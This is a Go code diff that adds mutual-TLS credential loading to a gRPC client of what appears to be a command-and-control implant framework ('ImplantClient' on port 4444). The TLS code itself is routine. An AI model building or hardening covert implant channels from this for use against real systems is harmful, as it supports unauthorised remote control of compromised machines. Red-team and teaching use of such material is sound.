@@ -12,6 +12,33 @@ import (
 	"google.golang.org/grpc"
 )
 
+func loadTLSCredentials() (credentials.TransportCredentials, error) {
+    // Load certificate of the CA who signed server's certificate
+    pemServerCA, err := ioutil.ReadFile("/etc/nginx/certs/ca.crt")
+    if err != nil {
+        return nil, err
+    }
+
+    certPool := x509.NewCertPool()
+    if !certPool.AppendCertsFromPEM(pemServerCA) {
+        return nil, fmt.Errorf("failed to add server CA's certificate")
+    }
+
+    // Load client's certificate and private key
+    clientCert, err := tls.LoadX509KeyPair("/etc/nginx/certs/client.crt", "/etc/nginx/certs/client.key")
+    if err != nil {
+        return nil, err
+    }
+
+    // Create the credentials and return it
+    config := &tls.Config{
+        Certificates: []tls.Certificate{clientCert},
+        RootCAs:      certPool,
+    }
+
+    return credentials.NewTLS(config), nil
+}
+
 func main() {
 	var (
 		opts   []grpc.DialOption
@@ -20,8 +47,8 @@ func main() {
 		client grpcapi.ImplantClient
 	)
 
-	opts = append(opts, grpc.WithInsecure())
-	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
+	//opts = append(opts, grpc.WithInsecure())
+	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), grpc.WithTransportCredentials(tlsCredentials)); err != nil {
 		log.Fatal(err)
 	}
 	defer conn.Close()
